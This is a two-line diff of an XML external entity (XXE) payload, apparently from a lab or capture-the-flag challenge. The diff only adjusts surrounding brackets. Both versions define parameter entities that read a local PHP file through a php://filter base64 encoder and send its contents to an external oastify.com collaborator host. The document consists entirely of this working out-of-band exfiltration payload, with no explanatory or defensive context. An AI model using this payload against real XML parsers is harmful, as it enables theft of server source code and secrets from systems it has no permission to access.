@@ -1,2 +1,2 @@
-[ <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/xampp/htdocs/challenge/XXE/stage2.php">
-<!ENTITY % mal "<!ENTITY xxe SYSTEM 'http://lk982b17bdi3pfgm3k94kur58wen2hq6.oastify.com/?x=%file;'> "> %mal;]>
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/xampp/htdocs/challenge/XXE/stage2.php">
+<!ENTITY % mal "<!ENTITY xxe SYSTEM 'http://lk982b17bdi3pfgm3k94kur58wen2hq6.oastify.com/?x=%file;'> "> %mal;
